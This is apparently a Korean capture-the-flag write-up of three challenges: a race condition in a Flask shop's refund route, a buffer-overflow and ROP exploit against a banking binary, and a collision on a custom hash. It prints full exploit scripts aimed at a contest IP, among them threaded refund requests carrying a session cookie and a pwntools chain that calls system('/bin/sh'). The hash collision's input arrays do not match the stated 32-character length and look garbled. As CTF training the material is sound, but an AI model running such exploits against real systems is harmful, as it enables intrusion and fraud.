




# oh_My_Cheeese(한별님)
## 문제 코드
```python
import sqlite3
import os
import uuid
import hashlib
from flask import Flask, flash,request, session,render_template, make_response, redirect, url_for
import time

app = Flask(__name__)
app.secret_key = os.urandom(32)

DATABASE = 'database.db'

FLAG = "FLAG{test_flag}"

def init_db():
    db = sqlite3.connect(DATABASE)
    cursor = db.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user (
            id INTEGER PRIMARY KEY,
            user_ID TEXT NOT NULL,
            user_PW TEXT NOT NULL,
            money INTEGER NOT NULL DEFAULT 500,
            user_cheeese INTEGER DEFAULT 0,
            user_flag INTEGER DEFAULT 0,
            unique(user_ID)
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS items (
            id INTEGER PRIMARY KEY,
            name TEXT NOT NULL,
            price INTEGER NOT NULL,
            content TEXT NOT NULL,
            unique(name)
        )
    ''')

    cursor.execute("INSERT OR IGNORE INTO items (name, price, content) VALUES (?, ?, ?)", ('cheeeese', 500, 'hehe'))
    cursor.execute("INSERT OR IGNORE INTO items (name, price, content) VALUES (?, ?, ?)", ('FLAG', 5000, FLAG))
    db.commit()

def execute_query(query, values=None):
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    if values is None:
        cursor.execute(query)
    else:
        cursor.execute(query, values)
    conn.commit()
    return cursor


def get_user(user_id):
    user = execute_query('SELECT * FROM user WHERE user_ID = ?', (user_id,)).fetchone()
    if user:
        return user
    return None


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/market')
def market():
    if session == {}:
        return "<script>alert('Login Plz');location.href='/login'</script>"
    return render_template('market.html')

@app.route('/refund')
def refund():
    if session == {}:
        return "<script>alert('Login Plz');location.href='/login'</script>"
    return render_template('refund.html')

@app.route('/mypage')
def mypage():
    
    if session == {}:
        return "<script>alert('Login Plz');location.href='/login'</script>"
    
    user = get_user(session['id'])
    flag = user[5]
    if user[5] > 0:
        flag = execute_query("SELECT * FROM items where name='FLAG'").fetchone()[3]
    return render_template("mypage.html",money=user[3],cheese=user[4],flag=flag)
    



@app.route("/item/refund/cheeese",methods=['GET'])
def cheese_refund():
    if session == {}:
        return "<script>alert('Login Plz');location.href='/login'</script>"
    
    user = get_user(session['id'])
    user_money = user[3]
    cheese_num = user[4]
    
    
    if cheese_num <= 0:
        return "<script>alert('you Don have cheese!');location.href='/'</script>"


    cheese_num -= 1
    
    execute_query('UPDATE user SET money=money+500, user_cheeese=? where user_ID=?',(cheese_num,session['id']))
    return "<script>alert('Thank you!');location.href='/'</script>"
    

@app.route('/item/purchase/flag', methods=['GET'])
def flag_purchase():
    if session == {}:
        return "<script>alert('Login Plz');location.href='/login'</script>"
    
    user = get_user(session['id'])
    user_money = user[3]
    flag_num = user[5]
   
    
    if user_money < 5000:
        return "<script>alert('Not enough money!');location.href='/'</script>"
    
    
    user_money -= 5000
    flag_num += 1
    
    execute_query('UPDATE user SET money=?, user_flag=? where user_ID=?',(user_money,flag_num,session['id']))
    
    return "<script>alert('Thank you!');location.href='/'</script>"
        
@app.route('/item/purchase/cheeese', methods=['GET'])
def cheese_purchase():
    if session == {}:
        return "<script>alert('Login Plz');location.href='/login'</script>"
    
    user = get_user(session['id'])
    user_money = user[3]
    cheese_num = user[4]
    

    if user_money < 100:
        return "<script>alert('Not enough money!');location.href='/'</script>"
    
    cheese_num += 1
    
    execute_query('UPDATE user SET money=money-500, user_cheeese=? where user_ID=?',(cheese_num,session['id']))
    
    return "<script>alert('Thank you!');location.href='/'</script>"

@app.route('/login', methods=['POST','GET'])
def login():
    if request.method=='GET':
        return render_template('login.html')
    
    user_id = request.form['id']
    user_pw = request.form['pw']
    user_pw = hashlib.sha256(user_pw.encode()).hexdigest()
    
    user = execute_query("SELECT * FROM user where user_ID=? AND user_PW=?", (user_id, user_pw)).fetchone()

    
    if user == None:
        return "<script>alert('fail!');location.href='/login'</script>"
        
    session['id'] = user[1]
    print(user)
    return redirect('/')

    
@app.route('/register', methods=['POST',"GET"])
def register():
    if request.method=='GET':
        return render_template('regist.html')

    user_id = request.form['id']
    user_pw = request.form['pw']
    
    if get_user(user_id) != None:
        return render_template('index.html')
    
    user_pw = hashlib.sha256(user_pw.encode()).hexdigest()
    execute_query('INSERT INTO user (user_ID, user_PW) VALUES (?, ?)', (user_id, user_pw))

    return "<script>alert('Success!');location.href='/login'</script>"
    
        

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=10011, threaded=True)
```


## 분석
Refund 기능을 이용하면 가지고 있는 상품을 다시 되팔 수 있음
하지만 Race condition이 발생할 수 있음
Race condition은 두 개 이상의 프로세스나 스레드가 데이터에 동시에 액세스하고 이를 수정하려 할 때 발생
두 명 이상의 사용자가 거의 동시에 `cheese_refund` 함수를 호출하고, 같은 사용자 세션을 사용하고 있을 때 문제가 발생할 수 있음
## Exploit
멀티쓰레딩을 통해 동시에 여러 번 Refund 요청을 날리면 중복으로 적용되어 여러 번 돈이 들어옴
따라서 이를 반복한 뒤 (구매 - 멀티쓰레딩 - 구매 - 멀티쓰레딩) 플래그를 구매하면 됨
아래의 코드가 race condition을 유발하려면 서버의 `/item/refund/cheeese` 엔드포인트가 아래 조건을 충족해야 함
1. 서버는 멀티스레딩 또는 멀티프로세싱 환경에서 실행(즉, 동시 요청을 처리할 수 있음).
2. 서버 측 응용 프로그램은 동시 데이터베이스 쓰기 작업을 동기화하지 않음
3. 데이터베이스 자체에 적절한 트랜잭션 관리나 락킹 메커니즘이 없거나, 코드가 그러한 메커니즘을 사용하지 않음

```python
import threading 
import requests 
def refund(): 
	url = f"http://54.180.98.27:1011/item/refund/cheeese" 
	headers = { "Cookie": "session=eyJpZCI6ImFhYWEifQ.ZUXHtg.rtzL_qMLMrAuQdKr-8vFoTedUYg" } 
	res = requests.get(url=url, headers=headers) 
	print(res.text) 
	
for i in range(10): 
t = threading.Thread(target=refund) 
t.start()
```

![[Pasted image 20231106135549.png]]

# bankwallet(judoking)
## 문제 코드
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[40]; // [rsp+10h] [rbp-30h] BYREF
  int v5; // [rsp+38h] [rbp-8h] BYREF
  int v6; // [rsp+3Ch] [rbp-4h]

  init();
  v6 = 0;
  puts("Welcome to Wallet!!");
  while ( count > 0 )
  {
    if ( v6 )
    {
      show_menu();
      __isoc99_scanf("%d", &v5);
      call_func(v5);
      if ( money < 0 )
      {
        puts("Oh, You Don't Have Money");
        printf("Don't run!! What's Youre name?");
        read(0, buf, 0x100uLL);
        printf("%s", buf);
        printf("Tell Me One More. What?");
        read(0, buf, 0x100uLL);
        puts("See You.. I will wait you.");
        money = 0;
      }
    }
    else
    {
      if ( (unsigned int)verify_password() != 1 )
        exit(0);
      v6 = 1;
    }
  }
  puts("Finish Your Trade");
  return 0;
}
```

```c
__int64 __fastcall call_func(int a1)
{
  if ( a1 == 4 )
    return lend();
  if ( a1 > 4 )
    goto LABEL_11;
  if ( a1 == 3 )
    return show_money();
  if ( a1 == 1 )
    return buy();
  if ( a1 != 2 )
  {
LABEL_11:
    printf("Error Code");
    exit(1);
  }
  return work();
}
```

```c
__int64 lend()
{
  __int64 result; // rax
  int v1; // [rsp+8h] [rbp-8h] BYREF

  puts("======== lend money ========");
  printf("Input Percentage: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 || v1 > 100 )
    printf("You Can't");
  else
    money *= v1;
  puts("lend finish");
  printf("your money : %d\n", (unsigned int)money);
  result = (unsigned int)(count - v1 / 10);
  count -= v1 / 10;
  return result;
}
```

```c
__int64 buy()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  puts("======== buy ========");
  show_item();
  printf("Choost Your Item :");
  __isoc99_scanf("%d", &v1);
  if ( 1000000 * v1 <= money )
  {
    puts("Good. Have a Good Day!");
    money += -1000000 * v1;
  }
  else
  {
    puts("Not enough Money!");
  }
  return (unsigned int)--count;
}
```


## 분석
처음에 인증과정이 있지만 난수로 설정된 비밀번호를 뚫어야 함
버퍼오버플로우를 이용해 인증을 우회할 수 있음
돈을 빌리는 lend와 돈으로 물건을 구매할 수 있는 buy 기능이 있고, 돈을 음수로 만들면 사용자의 이름을 2번 입력 받고 종료함
lend와 buy에서 돈을 음수로 입력 받을 수 있는 점을 이용해 돈을 계속 늘릴 수 있고,
Integer Overflow를 이용해 돈을 음수로 바꿀 수 있음
사용자의 이름을 입력받았을 때, 사용자의 이름을 입력 받고 이름을 다시 출력하는데, 이 때, `libc_start_main`를 알아낼 수 있고,
이를 이용해서 2번째 입력 때 다양한 가젯들을 이용하여, exploit할 수 있음

아래는 보호기법과 컴파일 정보들임 
```sh
┌──(foo1㉿main-server)-[~/Desktop/HspaceFinal/bankwallet]
└─$ checksec bankwallet 
[*] '/home/foo1/Desktop/HspaceFinal/bankwallet/bankwallet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```sh
┌──(foo1㉿main-server)-[~/Desktop/HspaceFinal/bankwallet]
└─$ file bankwallet 
bankwallet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7260333881aba02dd280878309c63b5e6bf9842a, for GNU/Linux 3.2.0, not stripped
```

## Exploit
```python
from pwn import * 

p = remote("54.180.98.27",1004)

e = ELF("./libc-2.31.so")

context.log_level = 'debug'

# 인증과정 우회
payload=b''
payload+=b'f'*104

p.recvuntil("System.")
p.sendline(payload)

payload=b''
payload+=b'6'*8

p.sendline(payload)

# 돈 음수 만들기
for i in range(100):
   p.sendline(b'4')
   p.sendline(b'-100')

   for i in range(10):
      p.sendline(b'2')

   p.sendline(b'3')

for i in range(8):
   p.sendline(b'4')

# libc_start_main 획득
p.send(b'a'*0x38)

p.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
a  = (p.recv(6) + b'\x00\x00')
print("AaAAAAAAAAAA : ",a)
a = u64(a)
print(a)

# ROP
libc_base = a - e.symbols['__libc_start_main'] - 243
system = libc_base + e.symbols['system']
binsh = libc_base + list(e.search(b"/bin/sh"))[0]
print("AaAAAAAAAAAA : ",a)
r = 0x000000000040101a
pr = 0x0000000000401953
payload = b'a' * 0x38
payload += p64(r)
payload += p64(pr)
payload += p64(binsh)
payload += p64(system)
p.send(payload)

p.interactive()
```


# daes(수현님)
## 분석
```python
# main.py
from hash import Hash

flag = open('./flag.txt').read()

m1, m2 = input('m1> ')[:32], input('m2> ')[:32]

assert(len(m1) == 32)
assert(len(m2) == 32)

m1, m2 = [ord(x) % 256 for x in m1], [ord(x) % 256 for x in m2]

check = False
for x1, x2 in zip(m1, m2): 
    if x1 != x2:
        check = True
        break
assert(check)

h = Hash(5)

d1, d2 = h.hash(m1), h.hash(m2)

for x1, x2 in zip(d1, d2): assert(x1 == x2)

print('¯\_(ツ)_/¯')
print(flag)

```

```python
# hash.py
S = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
     0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
     0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
     0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
     0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,
     0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
     0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,
     0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
     0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,
     0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
     0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,
     0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
     0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,
     0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
     0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
     0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
     0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,
     0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
     0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,
     0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
     0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
     0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
     0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,
     0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
     0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,
     0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
     0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
     0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
     0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,
     0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
     0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,
     0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16]

P = [0x0f, 0x06, 0x13, 0x14, 0x1c, 0x0b, 0x1b, 0x10, 
     0x00, 0x0e, 0x16, 0x19, 0x04, 0x11, 0x1e, 0x09, 
     0x01, 0x07, 0x17, 0x0d, 0x1f, 0x1a, 0x02, 0x08, 
     0x12, 0x0c, 0x1d, 0x05, 0x15, 0x0a, 0x03, 0x18]

X2 = [0x00, 0x02, 0x04, 0x06, 0x08, 0x0a, 0x0c, 0x0e,
      0x10, 0x12, 0x14, 0x16, 0x18, 0x1a, 0x1c, 0x1e,
      0x20, 0x22, 0x24, 0x26, 0x28, 0x2a, 0x2c, 0x2e,
      0x30, 0x32, 0x34, 0x36, 0x38, 0x3a, 0x3c, 0x3e,
      0x40, 0x42, 0x44, 0x46, 0x48, 0x4a, 0x4c, 0x4e,
      0x50, 0x52, 0x54, 0x56, 0x58, 0x5a, 0x5c, 0x5e,
      0x60, 0x62, 0x64, 0x66, 0x68, 0x6a, 0x6c, 0x6e,
      0x70, 0x72, 0x74, 0x76, 0x78, 0x7a, 0x7c, 0x7e,
      0x80, 0x82, 0x84, 0x86, 0x88, 0x8a, 0x8c, 0x8e,
      0x90, 0x92, 0x94, 0x96, 0x98, 0x9a, 0x9c, 0x9e,
      0xa0, 0xa2, 0xa4, 0xa6, 0xa8, 0xaa, 0xac, 0xae,
      0xb0, 0xb2, 0xb4, 0xb6, 0xb8, 0xba, 0xbc, 0xbe,
      0xc0, 0xc2, 0xc4, 0xc6, 0xc8, 0xca, 0xcc, 0xce,
      0xd0, 0xd2, 0xd4, 0xd6, 0xd8, 0xda, 0xdc, 0xde,
      0xe0, 0xe2, 0xe4, 0xe6, 0xe8, 0xea, 0xec, 0xee,
      0xf0, 0xf2, 0xf4, 0xf6, 0xf8, 0xfa, 0xfc, 0xfe,
      0x1b, 0x19, 0x1f, 0x1d, 0x13, 0x11, 0x17, 0x15,
      0x0b, 0x09, 0x0f, 0x0d, 0x03, 0x01, 0x07, 0x05,
      0x3b, 0x39, 0x3f, 0x3d, 0x33, 0x31, 0x37, 0x35,
      0x2b, 0x29, 0x2f, 0x2d, 0x23, 0x21, 0x27, 0x25,
      0x5b, 0x59, 0x5f, 0x5d, 0x53, 0x51, 0x57, 0x55,
      0x4b, 0x49, 0x4f, 0x4d, 0x43, 0x41, 0x47, 0x45,
      0x7b, 0x79, 0x7f, 0x7d, 0x73, 0x71, 0x77, 0x75,
      0x6b, 0x69, 0x6f, 0x6d, 0x63, 0x61, 0x67, 0x65,
      0x9b, 0x99, 0x9f, 0x9d, 0x93, 0x91, 0x97, 0x95,
      0x8b, 0x89, 0x8f, 0x8d, 0x83, 0x81, 0x87, 0x85,
      0xbb, 0xb9, 0xbf, 0xbd, 0xb3, 0xb1, 0xb7, 0xb5,
      0xab, 0xa9, 0xaf, 0xad, 0xa3, 0xa1, 0xa7, 0xa5,
      0xdb, 0xd9, 0xdf, 0xdd, 0xd3, 0xd1, 0xd7, 0xd5,
      0xcb, 0xc9, 0xcf, 0xcd, 0xc3, 0xc1, 0xc7, 0xc5,
      0xfb, 0xf9, 0xff, 0xfd, 0xf3, 0xf1, 0xf7, 0xf5,
      0xeb, 0xe9, 0xef, 0xed, 0xe3, 0xe1, 0xe7, 0xe5]

def xor(v1, v2): return [x1 ^ x2 for x1, x2 in zip(v1, v2)]
def sbox(v): return [S[x] for x in v]

class Hash:
    def __init__(self, t):
        self.t = t
        self.l = 16

    def hash(self, m):
        assert len(m) == self.l * 2

        a, b = m[: self.l], m[self.l :]
        for i in range(self.t - 1):
            a = self.round(b[:4], a)
            b = self.round(range(i, i + 4), a)
        a = self.round(b[:4], a, 8)
        o = xor(xor(a, m[: self.l]), m[self.l :])

        return o

    def round(self, k, x, pos = 0):
        z = self.f(k, x)
        y = x[4:] + x[:4]
        y[pos : pos + 4] = xor(z, y[pos : pos + 4])
        return y

    def f(self, k, x):
        k = sbox(k)
        y = xor(k, x)
        y = sbox(y)
        y = [(y[i // 8] >> (i % 8)) & 0x01 for i in P]
        y = [
            y[8 * i + 0] << 0
            | y[8 * i + 1] << 1
            | y[8 * i + 2] << 2
            | y[8 * i + 3] << 3
            | y[8 * i + 4] << 4
            | y[8 * i + 5] << 5
            | y[8 * i + 6] << 6
            | y[8 * i + 7] << 7
            for i in range(4)
        ]
        tmp = y[0] ^ y[1] ^ y[2] ^ y[3]
        return [X2[y[i] ^ y[(i + 1) % 4]] ^ tmp ^ y[i] for i in range(4)]
```

32개의 문자를 보내면 16번째부터 20번째 문자를 sbox에 입력한 결과와 16번째 문자까지의 값을 xor 하고 해시화 한 후에 마지막으로 앞의 16문자와 뒤의 16문 자를 xor함
이때 15번째 문자만 다르게 하고 20번째 문자까지 같게 하면 해시값은 뒤의 8자리만 다르게 됨 
뒤의 8자리는 24~32번째 문자로 잘 맞추면 해시값이 같게 됨

## exploit
```python
from pwn import *

io = remote('54.180.98.27', 1014)

m1 = [97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 0, 0, 0, 97, 97, 97, 97, 97, 97, 97, 101, 54, 151, 131, 123, 152, 122, 35]
m2 = [97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 0, 0, 0, 97, 97, 97, 97, 97, 97, 2, 151, 49, 138, 21, 252, 20, 142]

t1 = b''
t2 = b''

for i in m1:
    t1 += int.to_bytes(i,1, 'little')

for j in m2:
    t2 += int.to_bytes(j,1, 'little')

io.recvuntil(b'>')
io.sendline(t1)
io.recvuntil(b'>')
io.sendline(t2)

io.interactive()
```